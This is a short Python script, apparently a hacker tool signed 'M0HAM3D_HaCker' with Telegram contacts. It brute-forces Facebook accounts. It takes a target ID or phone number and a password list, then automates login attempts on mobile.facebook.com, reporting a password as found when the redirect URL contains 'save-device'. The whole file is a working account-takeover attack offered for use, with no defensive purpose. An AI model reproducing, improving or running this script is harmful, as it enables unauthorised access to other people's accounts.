#!/usr/bin/python
import os, sys, mechanicalsoup
y = '\033[1;33m'
b = '\033[1;34m'
r = '\033[1;31m'
g = '\033[1;37m'
os.system("clear")
print(r)
print("""
            ______________________________________________________
           |    _____________________________________________     |
           |   |                                             |    |
           |   |              BY:M0HAM3D_HaCker              |    |
           |   |          tele: @HcmohtatefOfficial          |    |
           |   |              tele: @HAKER33                 |    |
           |   |               git: M0HAM3D                  |    |
           |   |                  Fb HAK                     |    |
           |   |_____________________________________________|    |
           |______________________________________________________|\n\n""")

print(b)
put = input('Enter ID OR Number :> ')
kut = input('EnTer Passlist :> ')
lista = open(kut, 'r')
r = lista.readlines()
br = mechanicalsoup.StatefulBrowser()
for pwd in r:
    br.open('https://mobile.facebook.com')
    br.select_form('#login_form')
    br['email'] = put
    br['pass'] = pwd
    br.submit_selected(btnName='login')
    print ('[*] NoT Found ===>' + pwd)
    cls = br.get_url()
    if 'save-device' in cls:
       print ( '[+] PassWoRD is ===>' +pwd)

